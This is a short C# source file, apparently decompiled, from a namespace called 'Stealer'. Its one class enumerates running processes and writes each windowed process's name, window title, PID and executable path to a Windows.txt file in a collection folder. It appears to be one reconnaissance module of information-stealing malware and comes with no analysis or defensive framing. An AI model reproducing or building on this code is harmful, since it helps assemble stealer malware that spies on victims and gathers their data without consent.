using System;
using System.Diagnostics;
using System.IO;

namespace Stealer
{
	// Token: 0x02000015 RID: 21
	internal sealed class ActiveWindows
	{
		// Token: 0x06000074 RID: 116 RVA: 0x0000499C File Offset: 0x00002B9C
		public static void WriteWindows(string sSavePath)
		{
			foreach (Process process in Process.GetProcesses())
			{
				try
				{
					if (!string.IsNullOrEmpty(process.MainWindowTitle))
					{
						File.AppendAllText(sSavePath + "\\Windows.txt", string.Concat(new string[]
						{
							"NAME: ",
							process.ProcessName,
							"\n\tTITLE: ",
							process.MainWindowTitle,
							"\n\tPID: ",
							process.Id.ToString(),
							"\n\tEXE: ",
							ProcessList.ProcessExecutablePath(process),
							"\n\n"
						}));
					}
				}
				catch
				{
				}
			}
		}
	}
}
